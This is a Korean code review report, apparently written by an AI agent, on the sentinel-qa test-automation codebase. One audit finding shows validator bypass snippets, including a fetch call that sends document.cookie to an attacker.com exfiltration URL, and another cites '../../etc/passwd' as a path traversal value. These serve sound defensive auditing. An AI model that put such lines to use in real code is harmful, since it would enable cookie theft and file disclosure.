# Code Review Report: sentinel-qa 전체 코드베이스

**날짜**: 2026-03-31
**리뷰어**: Senior Code Review Agent (Architect-level)
**범위**: packages/mcp-server, packages/playwright-runner, packages/maestro-bridge, registry/
**커밋**: e6ccbbe (HEAD, main)
**목적**: standalone agent 리팩토링 전, 유지되는 모듈 중심의 품질 점검

---

## 요약

sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있다. 모듈 경계가 명확하고, 테스트 코드 보안 검증(validator.ts)이 존재하며, 테스트 커버리지도 핵심 모듈에 대해 충분하다. 그러나 **보안 검증의 우회 가능성**, **run-tests.ts의 God Function 문제**, **YAML 로딩 시 검증 부재**, **race condition 위험** 등 리팩토링 전 반드시 해결해야 할 이슈가 존재한다.

| 심각도 | 건수 |
|--------|------|
| CRITICAL | 2 |
| HIGH | 5 |
| MEDIUM | 7 |
| LOW | 4 |
| INFO | 3 |

---

## Critical & High Priority Findings

### [C-01] 테스트 코드 Validator 우회 가능성 (Security)
- **심각도**: CRITICAL
- **카테고리**: Security
- **파일**: `packages/playwright-runner/src/validator.ts:7-30`
- **이슈**: 정규식 기반 blocklist는 난독화로 쉽게 우회 가능하다. 예를 들어:
  ```typescript
  // 우회 예시 1: 문자열 결합
  const e = 'ev' + 'al';
  globalThis[e]('malicious code');

  // 우회 예시 2: Playwright의 page.evaluate() 내부에서 임의 코드 실행
  await page.evaluate(() => {
    // 여기서는 브라우저 context이므로 Node.js 제한이 무의미
    fetch('https://attacker.com/exfil?data=' + document.cookie);
  });

  // 우회 예시 3: 간접 접근
  const p = process;
  p['ex' + 'it'](1);
  ```
- **영향**: pilot-ai가 생성한 테스트 코드가 악의적이거나 잘못된 경우, 호스트 시스템에서 임의 코드 실행 가능
- **권장사항**:
  ```typescript
  // 1단계: AST 기반 검증으로 전환 (typescript compiler API 활용)
  import ts from 'typescript';

  function validateWithAST(code: string): ValidationResult {
    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const errors: string[] = [];

    function visit(node: ts.Node) {
      // CallExpression 검사 — eval, Function, require 등
      if (ts.isCallExpression(node)) {
        const name = node.expression.getText(sourceFile);
        if (BLOCKED_CALL_NAMES.has(name)) {
          errors.push(`${name}() is not allowed`);
        }
      }
      // ImportDeclaration 검사
      if (ts.isImportDeclaration(node)) {
        const specifier = (node.moduleSpecifier as ts.StringLiteral).text;
        if (!ALLOWED_MODULES.has(specifier)) {
          errors.push(`Import of "${specifier}" is not allowed`);
        }
      }
      ts.forEachChild(node, visit);
    }
    visit(sourceFile);
    return { valid: errors.length === 0, errors };
  }

  // 2단계: (장기) 격리된 sandbox 환경에서 실행 (Docker container, VM)
  ```

### [C-02] Maestro Bridge에서 appId 커맨드 인젝션 위험 (Security)
- **심각도**: CRITICAL
- **카테고리**: Security
- **파일**: `packages/maestro-bridge/src/runner.ts:120-126`
- **이슈**: `appId` 값이 `spawn`의 `args` 배열로 전달되므로 shell injection은 아니지만, `filePath`는 사용자 제공 `test.id`로부터 구성된다(line 49). `test.id`에 `../` 같은 경로 조작 문자가 있으면 temp directory 밖에 파일을 쓸 수 있다.
  ```typescript
  // runner.ts:49 — test.id가 검증 없이 파일 경로로 사용
  const filePath = join(tempDir, `${test.id}.yaml`);
  ```
- **영향**: Path traversal로 시스템 임의 위치에 YAML 파일 작성 가능
- **권장사항**:
  ```typescript
  import { basename } from 'node:path';

  // test.id를 파일명으로 사용하기 전 sanitize
  function sanitizeId(id: string): string {
    // 경로 구분자 제거, 알파벳/숫자/하이픈/언더스코어만 허용
    return id.replace(/[^a-zA-Z0-9_-]/g, '_');
  }

  const safeId = sanitizeId(test.id);
  const filePath = join(tempDir, `${safeId}.yaml`);

  // 결과 경로가 tempDir 내부인지 확인
  if (!filePath.startsWith(tempDir)) {
    throw new Error(`Invalid test ID: path traversal detected`);
  }
  ```

### [H-01] run-tests.ts God Function — 260줄 단일 함수 (Architecture)
- **심각도**: HIGH
- **카테고리**: Architecture & Design
- **파일**: `packages/mcp-server/src/tools/run-tests.ts:15-261`
- **이슈**: `registerRunTests` 내부 콜백이 260줄에 달하며 다음 책임을 모두 포함한다:
  1. 격리 필터링 (quarantine)
  2. 플랫폼 결정
  3. 플랫폼별 테스트 필터링
  4. Playwright 실행 + 결과 처리
  5. Maestro 실행 + 결과 변환
  6. 이벤트 검증
  7. 리포트 저장
  8. JSON 응답 구성
- **영향**: 단독 에이전트 전환 시 이 코드를 분리하지 않으면 유지보수가 극히 어려워진다. 현재도 web/flutter 로직이 중복되어 있다 (status record, report save 로직이 두 번 반복).
- **권장사항**:
  ```typescript
  // 역할별 분리
  // 1. TestFilterService — quarantine, platform 필터링
  // 2. TestOrchestrator — 플랫폼 라우팅 + 실행 조율
  // 3. ResultProcessor — 상태 기록, 이벤트 검증, 리포트 저장

  class TestOrchestrator {
    constructor(
      private runners: Map<Platform, TestRunner>,
      private statusStore: TestStatusStore,
      private reportStore: ReportStore,
      private registry: AppRegistry,
    ) {}

    async execute(appId: string, tests: TestCase[], options: RunOptions): Promise<RunResponse> {
      const runner = this.runners.get(options.platform);
      if (!runner) throw new Error(`No runner for platform: ${options.platform}`);

      const result = await runner.run(tests);
      await this.recordResults(appId, result);
      // ...
    }
  }
  ```

### [H-02] YAML 로딩 시 런타임 검증 부재 (Type Safety)
- **심각도**: HIGH
- **카테고리**: Type Safety / Security
- **파일**: `packages/mcp-server/src/utils/yaml-loader.ts:4-7`
- **이슈**: `loadYaml<T>` 함수가 `as T` 타입 단언만 하고 실제 런타임 검증을 하지 않는다. YAML 파일이 기대 스키마와 다르면 런타임에 `undefined` 접근 에러가 발생한다.
  ```typescript
  // 현재: 위험한 타입 단언
  export async function loadYaml<T>(filePath: string): Promise<T> {
    const content = await readFile(filePath, 'utf-8');
    return parse(content) as T;  // 실제 T인지 검증 없음
  }
  ```
- **영향**: 잘못된 YAML 파일이 조용히 로딩되어 후속 처리에서 cryptic한 에러 발생
- **권장사항**:
  ```typescript
  import { z, ZodSchema } from 'zod';

  export async function loadYaml<T>(filePath: string, schema: ZodSchema<T>): Promise<T> {
    const content = await readFile(filePath, 'utf-8');
    const raw = parse(content);
    return schema.parse(raw);  // 런타임 검증 + 타입 안전성
  }

  // 사용:
  const config = await loadYaml(appsPath, appsConfigSchema);
  ```
  참고: `event-validation/schema.ts`에 이미 Zod 스키마가 있으므로, 이를 `loadYaml`에 통합하면 된다.

### [H-03] TestStatusStore의 Race Condition (Error Handling / Resilience)
- **심각도**: HIGH
- **카테고리**: Error Handling & Resilience
- **파일**: `packages/mcp-server/src/store/test-status-store.ts:54-97`
- **이슈**: `recordRun`이 load → modify → save 패턴을 사용하는데, 동시에 여러 테스트 결과가 기록되면 마지막 writer가 이전 결과를 덮어쓴다. `run-tests.ts:105-107`에서 순차 `await`이긴 하지만, 향후 병렬화하면 즉시 문제된다.
  ```typescript
  // run-tests.ts:105-107 — 현재는 순차이지만 위험
  for (const testResult of result.tests) {
    await statusStore.recordRun(app_id, testResult.id, testResult.status === 'passed');
    // 매번 전체 파일을 읽고 다시 쓴다 — O(n^2) I/O
  }
  ```
- **영향**: N개 테스트 결과 기록 시 N번의 파일 읽기/쓰기 발생 (비효율). 병렬 실행 시 데이터 손실.
- **권장사항**:
  ```typescript
  // 1. 배치 기록 메서드 추가
  async recordBatch(appId: string, results: Array<{testId: string; passed: boolean}>): Promise<TestStatus[]> {
    const statuses = await this.load(appId);
    const updated: TestStatus[] = [];

    for (const { testId, passed } of results) {
      let entry = statuses.find((s) => s.id === testId);
      if (!entry) {
        entry = { id: testId, status: 'new', passRate: 0, runHistory: [], lastRun: '' };
        statuses.push(entry);
      }
      // ... update logic
      updated.push(entry);
    }

    await this.save(appId, statuses);  // 한 번만 쓴다
    return updated;
  }

  // 2. 장기적으로는 파일 잠금 또는 SQLite로 전환
  ```

### [H-04] Playwright Runner에서 test.id Path Traversal (Security)
- **심각도**: HIGH
- **카테고리**: Security
- **파일**: `packages/playwright-runner/src/runner.ts:164-167`
- **이슈**: C-02와 동일한 패턴. 인덱스 기반으로 파일명을 생성하므로 현재는 안전하지만, `parseJsonReport`에서 `test-${i}.spec.ts` 매핑이 `idMap`을 통해 이루어지므로 일관성을 유지해야 한다.
  ```typescript
  // 현재는 안전 (인덱스 사용)
  const fileName = `test-${i}.spec.ts`;
  ```
  그러나 향후 `test.id`를 파일명에 포함하면 즉시 취약해진다.
- **영향**: 현재 안전하나, 리팩토링 시 실수할 위험이 높음
- **권장사항**: 방어적으로 sanitize 함수를 추가하고 문서화

### [H-05] Event Validation이 항상 빈 배열로 호출됨 (Data Flow)
- **심각도**: HIGH
- **카테고리**: Data Flow / Dead Code
- **파일**: `packages/mcp-server/src/tools/run-tests.ts:121`
- **이슈**: 이벤트 검증 로직이 존재하지만, `capturedEvents`가 항상 빈 배열이다:
  ```typescript
  const capturedEvents: CapturedEvent[] = [];  // 항상 비어 있음
  eventValidation = validateEvents(eventSpec.events, capturedEvents);
  // 결과: 모든 이벤트가 항상 'missing'
  ```
  주석에 "will be fully integrated when the Playwright runner supports event capture"라고 되어 있지만, 현재 상태에서 `validate_events: true`로 호출하면 사용자가 잘못된 결과를 받게 된다.
- **영향**: 사용자가 event validation 결과를 신뢰할 수 없음
- **권장사항**: (A) `validate_events`가 true일 때 "not yet implemented" 경고를 반환하거나, (B) Playwright runner에 network interception을 구현하여 실제 이벤트를 캡처하도록 한다. standalone agent 전환 시 이 기능 완성을 우선시해야 한다.

---

## Medium & Low Priority Findings

### [M-01] Playwright/Maestro 결과 타입 불일치 (Type Safety)
- **심각도**: MEDIUM
- **카테고리**: Type Safety
- **파일**: `packages/mcp-server/src/tools/run-tests.ts:196-209`
- **이슈**: Maestro 결과를 Playwright의 `RunResult` 타입으로 수동 변환하고 있다. 이는 두 runner의 공통 인터페이스가 없기 때문이다.
  ```typescript
  const runResult: RunResult = {
    passed: maestroResult.passed,
    failed: maestroResult.failed,
    skipped: 0,  // Maestro에는 없는 필드를 하드코딩
    timedOut: 0,
    // ...
    tests: maestroResult.tests.map((t) => ({
      // 'cancelled' → 'skipped' 변환
      status: t.status === 'cancelled' ? 'skipped' as const : t.status,
    })),
  };
  ```
- **권장사항**: 공통 `TestRunResult` 인터페이스를 별도 패키지로 추출하고, 각 runner가 이를 구현하도록 한다.
  ```typescript
  // packages/shared-types/src/index.ts
  export interface UnifiedRunResult {
    passed: number;
    failed: number;
    skipped: number;
    total: number;
    duration: number;
    tests: UnifiedTestResult[];
  }
  ```

### [M-02] AppRegistry에서 Path Traversal 미검증 (Security)
- **심각도**: MEDIUM
- **카테고리**: Security
- **파일**: `packages/mcp-server/src/registry/registry.ts:39,52`
- **이슈**: `app.context.selectors`와 `app.context.event_spec`가 `resolve(this.registryDir, ...)`로 결합되는데, YAML 파일에 `../../etc/passwd` 같은 값이 있으면 registryDir 밖의 파일을 읽을 수 있다.
- **권장사항**:
  ```typescript
  const resolvedPath = resolve(this.registryDir, relativePath);
  if (!resolvedPath.startsWith(this.registryDir)) {
    throw new Error(`Path traversal detected: ${relativePath}`);
  }
  ```

### [M-03] Logger에 구조화된 로깅 부재 (Code Quality)
- **심각도**: MEDIUM
- **카테고리**: Code Quality
- **파일**: `packages/mcp-server/src/utils/logger.ts`
- **이슈**: `console.error`에 spread arguments를 전달하면 JSON 구조 로그가 아닌 비구조적 출력이 된다. standalone agent에서는 로그 파싱이 필요할 수 있다.
- **권장사항**: 최소한 timestamp와 level을 포함하는 구조화된 포맷을 적용
  ```typescript
  export const logger = {
    info: (...args: unknown[]) =>
      console.error(JSON.stringify({ level: 'info', ts: Date.now(), msg: args })),
    // ...
  };
  ```

### [M-04] capture-patterns.ts의 silent error swallowing (Error Handling)
- **심각도**: MEDIUM
- **카테고리**: Error Handling
- **파일**: `packages/mcp-server/src/event-validation/capture-patterns.ts:38,59,79,105`
- **이슈**: 모든 파서에서 `catch { /* ignore parse errors */ }` 패턴을 사용한다. 파싱 실패 시 빈 배열을 반환하므로 이벤트가 누락되어도 사용자에게 알림이 없다.
- **권장사항**: 최소한 debug 로그를 남기거나, 파싱 실패 이벤트를 별도 카운터로 추적

### [M-05] ReportStore.getLatest에서 JSON 파싱 타입 미검증 (Type Safety)
- **심각도**: MEDIUM
- **카테고리**: Type Safety
- **파일**: `packages/mcp-server/src/report/report-store.ts:79-80`
- **이슈**: `JSON.parse(raw)`의 결과가 검증 없이 `RunResult & { meta: ReportMeta }`로 반환된다. 파일이 손상되었거나 스키마가 변경된 경우 런타임 에러 발생.
- **권장사항**: Zod 스키마로 파싱 결과를 검증하거나, 최소한 필수 필드 존재 여부를 확인

### [M-06] Maestro Runner의 순차 실행 (Performance)
- **심각도**: MEDIUM
- **카테고리**: Performance
- **파일**: `packages/maestro-bridge/src/runner.ts:58-82`
- **이슈**: 모든 Maestro 테스트가 순차적으로 실행된다. 독립적인 테스트의 경우 병렬 실행이 가능하다.
- **권장사항**: `concurrency` 옵션을 추가하여 병렬 실행 지원. 단, Maestro CLI가 디바이스를 공유하므로 디바이스 pool 관리가 필요.

### [M-07] TestStore가 인메모리 전용 (Architecture)
- **심각도**: MEDIUM
- **카테고리**: Architecture
- **파일**: `packages/mcp-server/src/store/test-store.ts`
- **이슈**: `TestStore`는 순수 인메모리 `Map`이다. 프로세스 재시작 시 저장된 테스트가 모두 사라진다. `TestStatusStore`는 파일 기반인데 `TestStore`만 인메모리인 것은 비일관적이다.
- **권장사항**: standalone agent에서는 `TestStore`도 파일 기반 또는 SQLite로 전환을 고려

### [L-01] Playwright Runner의 progress 파싱이 부정확 (Code Quality)
- **심각도**: LOW
- **카테고리**: Code Quality
- **파일**: `packages/playwright-runner/src/runner.ts:260-275`
- **이슈**: stderr 누적 문자열에서 progress를 역순으로 찾는 로직이 있지만, `total`이 항상 `-1`로 전달된다.
  ```typescript
  options.onProgress(current, -1, progressLine.trim());  // total = -1 ???
  ```
- **권장사항**: total을 정확히 전달하거나, progress 타입에서 optional로 변경

### [L-02] 미사용 startTime 변수 (Dead Code)
- **심각도**: LOW
- **카테고리**: Code Quality
- **파일**: `packages/maestro-bridge/src/parser.ts:19`
- **이슈**: `const startTime = Date.now();`가 선언되었지만 사용되지 않는다.
- **권장사항**: 제거

### [L-03] Registry의 동기적 existsSync 사용 (Performance)
- **심각도**: LOW
- **카테고리**: Performance
- **파일**: `packages/mcp-server/src/registry/registry.ts:17,40,50`, `packages/mcp-server/src/report/report-store.ts:59,74`
- **이슈**: 비동기 코드 내에서 `existsSync`를 사용한다. Event loop을 블로킹한다.
- **권장사항**: `access(path, constants.F_OK)`로 대체하거나, try-catch로 `readFile`을 감싸서 ENOENT를 처리 (이미 TestStatusStore에서 이 패턴을 사용 중)

### [L-04] matchAnalyticsUrl의 단순 substring matching (Code Quality)
- **심각도**: LOW
- **카테고리**: Code Quality
- **파일**: `packages/mcp-server/src/event-validation/capture-patterns.ts:152-163`
- **이슈**: glob 패턴을 단순 substring matching으로 처리한다. `google-analytics.com`이 URL 어디에든 있으면 매칭되므로 false positive 가능.
- **권장사항**: `micromatch` 또는 `picomatch` 라이브러리로 정확한 glob matching 수행, 또는 `URL` 파싱 후 hostname 기반 매칭

---

## Info

### [I-01] Zod 3.x 제약 문서화
- **카테고리**: Project Compliance
- CLAUDE.md에 "Zod 3.x — MCP SDK compatibility"로 명시되어 있으나, `package.json`에는 `"zod": "^3.24.4"`로만 되어 있다. MCP SDK 업데이트 시 Zod 4 호환성 확인 필요.

### [I-02] lint 스크립트 미구현
- **카테고리**: Code Quality
- 모든 패키지의 lint 스크립트가 `echo "No lint yet"`이다. ESLint + strict TypeScript 규칙 도입을 권장한다.

### [I-03] 타입 안전성을 위한 Branded Types 고려
- **카테고리**: Type Safety
- `appId`, `testId` 같은 식별자가 모두 `string` 타입이다. Branded types를 사용하면 잘못된 ID를 전달하는 실수를 컴파일 타임에 방지할 수 있다.
  ```typescript
  type AppId = string & { readonly __brand: 'AppId' };
  type TestId = string & { readonly __brand: 'TestId' };
  ```

---

## 긍정적 관찰

1. **보안 의식이 높다**: Playwright validator가 존재하고 블록 패턴이 포괄적이다. `console.log` 금지 규칙도 잘 지켜지고 있다.
2. **테스트 품질이 우수하다**: event-validation, test-status-store, validator, parse-report, parser 등 핵심 모듈에 대해 다양한 케이스를 커버하는 테스트가 있다. 특히 boundary case (empty arrays, unmatched flows)도 테스트한다.
3. **MCP tool registration 패턴이 깔끔하다**: 각 tool이 별도 파일로 분리되어 있고, dependency injection으로 결합도가 낮다.
4. **Cancellation 지원이 잘 구현되어 있다**: AbortSignal을 통한 취소가 Playwright runner와 Maestro bridge 모두에서 지원된다.
5. **TestStatusStore의 quarantine 시스템이 잘 설계되어 있다**: 5회 윈도우 기반 promote/demote 로직이 명확하고 테스트도 충분하다.
6. **ESM-only 규칙이 일관되게 적용되어 있다**: 모든 import에 `.js` 확장자가 사용되고, `"type": "module"`이 설정되어 있다.

---

## Standalone Agent 전환 시 우선순위 Action Items

유지되는 모듈(event-validation, test-status-store, report/markdown, registry, playwright-runner core, maestro-bridge core) 기준:

### 필수 (리팩토링 전)
- [ ] **[C-01]** validator.ts를 AST 기반 검증으로 강화하거나, 최소한 `globalThis[...]` 패턴 차단 추가
- [ ] **[C-02]** Maestro bridge의 test.id를 sanitize하여 path traversal 방지
- [ ] **[H-01]** run-tests.ts에서 공통 로직(status record, report save)을 별도 서비스로 추출
- [ ] **[H-02]** loadYaml에 Zod 스키마 검증 통합
- [ ] **[H-03]** TestStatusStore에 recordBatch 메서드 추가

### 권장 (리팩토링 중)
- [ ] **[H-05]** Event capture를 Playwright runner에 실제 구현하거나 "not implemented" 경고 반환
- [ ] **[M-01]** 공통 TestRunResult 인터페이스 정의
- [ ] **[M-02]** Registry의 path traversal 검증 추가
- [ ] **[M-07]** TestStore 영속화 전략 결정
- [ ] **[I-02]** ESLint 설정 도입

### 개선 (리팩토링 후)
- [ ] **[M-03]** 구조화된 로깅 적용
- [ ] **[M-04]** Analytics parser에 에러 추적 추가
- [ ] **[M-06]** Maestro 병렬 실행 지원
- [ ] **[L-02]** parser.ts의 미사용 변수 제거

---

## 전체 코드 건강도 평가

**등급: B+**

아키텍처 기반이 탄탄하고, 보안 의식이 있으며, 핵심 로직에 테스트가 잘 작성되어 있다. Critical 이슈 2건은 보안 관련으로 반드시 수정해야 하며, run-tests.ts의 분해가 standalone agent 전환의 핵심 과제이다. 이 리뷰의 action items를 순서대로 해결하면 A 등급 프로젝트로 충분히 도달 가능하다.

---

*Generated by Senior Code Review Agent at 2026-03-31*
